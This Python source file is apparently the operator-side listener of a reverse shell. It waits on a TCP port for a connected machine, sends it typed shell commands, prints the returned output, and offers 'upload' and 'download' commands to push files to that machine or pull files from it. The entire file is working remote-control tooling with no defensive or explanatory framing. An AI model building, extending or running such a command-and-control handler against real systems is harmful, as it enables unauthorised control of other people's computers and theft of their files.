import socket
import os
import struct
import traceback
import subprocess
import threading


def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f'Listening on {port}...')

    client, addr = server.accept()
    print(f'Connection established: {addr[0]}:{addr[1]}')

    shell_session(client, addr, server)




def send_file(filename, client):
    if os.path.exists(filename):
        file_size = os.path.getsize(filename)
        client.send(struct.pack('!Q', file_size))  # Send file size (8 bytes)
        
        with open(filename, 'rb') as f:
            while chunk := f.read(4096):
                client.sendall(chunk)
    else:
        client.send(b'ERROR: File not found')





def recv_file(filename, client):
    file_size = struct.unpack('!Q', client.recv(8))[0]  # Receive file size (8 bytes)
    received = 0

    with open(filename, 'wb') as f:
        while received < file_size:
            data = client.recv(4096)
            if not data:
                break
            f.write(data)
            received += len(data)





def shell_session(client, addr, server):
    exit_list = ['exit', 'break', 'close', 'bye', 'quit']

    try:
        while True:
            command = input(f'{addr[0]}\033[1m*\033[32m>_\033[m: ').strip()
            if command.lower() in exit_list:
                client.send(command.lower().encode())
                break
            elif not command:
                pass
            elif command.startswith('!'):
                local_command = command[1:].strip()
                if local_command.startswith('cd'):
                    path = local_command[3:].strip()
                    try:
                        os.chdir(path)
                        print(f'Changed local directory to: {os.getcwd()}')
                    except FileNotFoundError:
                        print(f'Error: No such directory: "{path}"')
                    except PermissionError:
                        print(f'Error: Permission denied: "{path}"')
                    except NotADirectoryError:
                        print(f'Error: Not a directory: "{path}"')
                else:
                    subprocess.run(local_command, shell=True)
            elif command.startswith('upload'):
                client.send(command.encode())

                filename = command[7:].strip()
                send_file(filename, client)
                continue
                #thread = threading.Thread(target=send_file, args=(filename, client))
                #thread.start()
                #thread.join()
            elif command.startswith('download'):
                client.send(command.encode())

                filename = command[9:].strip()
                recv_file(filename, client)
                continue
                #thread = threading.Thread(target=recv_file, args=(filename, client))
                #thread.start()
                #thread.join()
            else:
                client.send(command.encode())
                output = client.recv(1024).decode()
                if output not in ['no output!', 'chdir']:
                    print(output)
    except Exception as e:
        print(f'Error: {e}')
        print(traceback.format_exc())
    finally:
        server.close()


def main():
    host = '127.0.0.1'
    port = 8080

    start_server(host, port)


if __name__ == '__main__':
    main()
